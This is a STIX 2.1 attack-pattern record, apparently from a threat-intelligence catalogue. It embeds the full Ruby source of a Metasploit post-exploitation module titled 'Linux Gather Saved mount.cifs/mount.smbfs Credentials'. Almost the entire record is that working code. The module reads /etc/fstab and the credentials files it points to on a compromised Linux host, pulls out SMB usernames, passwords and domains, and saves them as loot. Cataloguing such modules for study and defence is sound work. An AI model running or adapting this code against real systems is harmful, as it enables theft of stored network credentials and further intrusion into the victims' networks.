{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f6a7c998-c5f7-4a59-8b8c-df417b8fbbb9",
    "created": "2024-08-14T16:33:17.987034Z",
    "modified": "2024-08-14T16:33:17.987038Z",
    "name": "Linux Gather Saved mount.cifs/mount.smbfs Credentials",
    "description": " Post Module to obtain credentials saved for mount.cifs/mount.smbfs in /etc/fstab on a Linux system.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/gather/mount_cifs_creds.rb",
            "external_id": "mount_cifs_creds.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Linux Gather Saved mount.cifs/mount.smbfs Credentials',\n        'Description' => %q{\n          Post Module to obtain credentials saved for mount.cifs/mount.smbfs in\n          /etc/fstab on a Linux system.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['Jon Hart <jhart[at]spoofed.org>'],\n        'Platform' => ['linux'],\n        'SessionTypes' => ['shell', 'meterpreter']\n      )\n    )\n  end\n\n  def run\n    # keep track of any of the credentials files we read so we only read them once\n    cred_files = []\n    # where we'll store hashes of found credentials while parsing.  reporting is done at the end.\n    creds = []\n    # A table to store the found credentials for loot storage afterward\n    cred_table = Rex::Text::Table.new(\n      'Header' => 'mount.cifs credentials',\n      'Indent' => 1,\n      'Columns' =>\n      [\n        'Username',\n        'Password',\n        'Server',\n        'File'\n      ]\n    )\n\n    # parse each line from /etc/fstab\n    fail_with(Failure::NotFound, '/etc/fstab not found on system') unless file_exist?('/etc/fstab')\n    read_file('/etc/fstab').each_line do |fstab_line|\n      fstab_line.strip!\n      # where we'll store the current parsed credentials, if any\n      cred = {}\n      # if the fstab line utilizies the credentials= option, read the credentials from that file\n      next unless (fstab_line =~ %r{//([^/]+)/\\S+\\s+\\S+\\s+cifs\\s+.*})\n\n      cred[:host] = ::Regexp.last_match(1)\n      # IPs can occur using the ip option, which is a backup/alternative\n      # to letting UNC resolution do its thing\n      cred[:host] = ::Regexp.last_match(1) if (fstab_line =~ /ip=([^, ]+)/)\n      if (fstab_line =~ /cred(?:entials)?=([^, ]+)/)\n        file = ::Regexp.last_match(1)\n        # skip if we've already parsed this credentials file\n        next if cred_files.include?(file)\n\n        # store it if we haven't\n        cred_files << file\n        # parse the credentials\n        cred.merge!(parse_credentials_file(file))\n      # if the credentials are directly in /etc/fstab, parse them\n      elsif (fstab_line =~ %r{//([^/]+)/\\S+\\s+\\S+\\s+cifs\\s+.*(?:user(?:name)?|pass(?:word)?)=})\n        cred.merge!(parse_fstab_credentials(fstab_line))\n      end\n\n      creds << cred\n    end\n\n    # all done.  clean up, report and loot.\n    creds.flatten!\n    creds.compact!\n    creds.uniq!\n    creds.each do |cred|\n      if Rex::Socket.dotted_ip?(cred[:host])\n        report_cred(\n          ip: cred[:host],\n          port: 445,\n          service_name: 'smb',\n          user: cred[:user],\n          password: cred[:pass],\n          proof: '/etc/fstab'\n        )\n      end\n      cred_table << [ cred[:user], cred[:pass], cred[:host], cred[:file] ]\n    end\n\n    # store all found credentials\n    unless cred_table.rows.empty?\n      print_line(\"\\n\" + cred_table.to_s)\n      p = store_loot(\n        'mount.cifs.creds',\n        'text/csv',\n        session,\n        cred_table.to_csv,\n        'mount_cifs_credentials.txt',\n        'mount.cifs credentials'\n      )\n      print_status(\"CIFS credentials saved in: #{p}\")\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :session,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password,\n      session_id: session_db_id,\n      post_reference_name: refname\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  # Parse mount.cifs credentials from +line+, assumed to be a line from /etc/fstab.\n  # Returns the username+domain and password as a hash.\n  def parse_fstab_credentials(line, file = '/etc/fstab')\n    creds = {}\n    # get the username option, which comes in one of four ways\n    user_opt = ::Regexp.last_match(1) if (line =~ /user(?:name)?=([^, ]+)/)\n    if user_opt\n      case user_opt\n      # domain/user%pass\n      when %r{^([^/]+)/([^%]+)%(.*)$}\n        creds[:user] = \"#{::Regexp.last_match(1)}\\\\#{::Regexp.last_match(2)}\"\n        creds[:pass] = ::Regexp.last_match(3)\n      # domain/user\n      when %r{^([^/]+)/([^%]+)$}\n        creds[:user] = \"#{::Regexp.last_match(1)}\\\\#{::Regexp.last_match(2)}\"\n      # user%password\n      when /^([^%]+)%(.*)$/\n        creds[:user] = ::Regexp.last_match(1)\n        creds[:pass] = ::Regexp.last_match(2)\n      # user\n      else\n        creds[:user] = user_opt\n      end\n    end\n\n    # get the password option if any\n    creds[:pass] = ::Regexp.last_match(1) if (line =~ /pass(?:word)?=([^, ]+)/)\n\n    # get the domain option, if any\n    creds[:user] = \"#{::Regexp.last_match(1)}\\\\#{creds[:user]}\" if (line =~ /dom(?:ain)?=([^, ]+)/)\n\n    creds[:file] = file unless creds.empty?\n\n    creds\n  end\n\n  # Parse mount.cifs credentials from +file+, returning the username+domain and password\n  # as a hash.\n  def parse_credentials_file(file)\n    creds = {}\n    domain = nil\n    read_file(file).each_line do |credfile_line|\n      case credfile_line\n      when /domain=(.*)/\n        domain = ::Regexp.last_match(1)\n      when /password=(.*)/\n        creds[:pass] = ::Regexp.last_match(1)\n      when /username=(.*)/\n        creds[:user] = ::Regexp.last_match(1)\n      end\n    end\n    # prepend the domain if one was found\n    creds[:user] = \"#{domain}\\\\#{creds[:user]}\" if (domain && creds[:user])\n    creds[:file] = file unless creds.empty?\n\n    creds\n  end\nend\n",
    "x_mitre_platforms": [
        "['linux']"
    ]
}